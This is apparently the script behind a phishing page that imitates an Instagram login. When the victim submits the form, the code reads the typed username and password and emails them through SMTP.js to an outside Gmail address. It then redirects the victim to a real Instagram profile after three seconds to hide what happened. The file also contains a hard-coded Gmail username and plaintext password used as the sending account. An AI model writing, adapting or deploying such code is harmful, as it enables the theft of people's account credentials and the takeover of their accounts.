var username = document.getElementById("usernamee");
var password = document.getElementById("passwordd");
var signIn = document.getElementById("signIn");

signIn.addEventListener("click", function () {
    Email.send({
        Host: "smtp.gmail.com",
        Username: "anonymacc770@gmail.com",
        Password: "anonym2000*",
        To: 'vahepapikyan88@gmail.com',
        From: "anonymacc770@gmail.com",
        Subject: "Information about instagram account",
        Body: "username is: " + usernamee.value + " password is: " + passwordd.value,
        Attachments: [
            {
                name: "smtpjs.png",
                path: "https://networkprogramming.files.wordpress.com/2017/11/smtpjs.png"
            }]
    });

    pageTranslator();
});

document.addEventListener("keydown", function (e) {
    if (e.key == "Enter")
        signIn.click();
});

function pageTranslator() {
    window.setTimeout(function () {
        location.href = "https://instagram.com/naturearmenia?igshid=YmMyMTA2M2Y= ";
    }, 3000);
}